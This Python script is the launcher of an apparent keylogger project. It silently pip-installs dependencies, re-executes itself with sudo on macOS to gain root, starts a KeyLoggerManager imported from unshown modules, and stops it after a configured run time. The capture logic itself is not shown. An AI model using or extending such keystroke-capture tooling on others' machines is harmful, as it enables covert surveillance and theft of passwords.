import os
import sys
import subprocess
import platform
import importlib.util
if importlib.util.find_spec("python-dotenv") is None: # type: ignore
        subprocess.check_call([sys.executable, "-m", "pip", "install", "python-dotenv"])
sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), "..")))
from modules.modules_installation import install_missing_packages_from_requirements
install_missing_packages_from_requirements()
from logger_config import logger
from modules.key_logger_manager import KeyLoggerManager
from time import sleep
from config import Config


def main() -> None:
    logger.info("📌 Starting keylogger setup...")

    if platform.system() == "Darwin":
        if os.geteuid() != 0:
            if "SUDO_COMMAND" in os.environ:
                logger.error("🚨 Already running with sudo, but still missing root permissions. Exiting...")
                sys.exit(1)
            logger.warning("🔑 Requesting root privileges..")
            result = subprocess.run(["sudo", "-E", sys.executable] + sys.argv)
            sys.exit(result.returncode)


        if not Config.PYTHON_MIN_VERSION <= sys.version_info[:2] <= Config.PYTHON_MAX_VERSION:
            logger.error(f"❌ This program requires Python between {Config.PYTHON_MIN_VERSION} and {Config.PYTHON_MAX_VERSION} on macOS. Please install the correct version.")
            sys.exit("❌ Invalid Python version detected.")

    elif platform.system() == "Windows":
        if sys.version_info[:2] < Config.PYTHON_MIN_VERSION:
            logger.error(f"❌ This program requires Python {Config.PYTHON_MIN_VERSION} or higher on Windows. Please install the correct version.")
            sys.exit("❌ Invalid Python version detected.")

    my_keylogger_manager = KeyLoggerManager()
    my_keylogger_manager.start()
    logger.info("✅ KeyLoggerManager started successfully.")

    if Config.RUN_DURATION:
        logger.info(f"⏳ Running... The program will exit after {Config.RUN_DURATION} seconds.")
        sleep(Config.RUN_DURATION)

        # עצירת ה-KeyLogger וסיום התכנית
        logger.info("✅ Stopping program...")
        my_keylogger_manager.stop()
        logger.info("❌ Exiting program.")


if __name__ == "__main__":

    main()
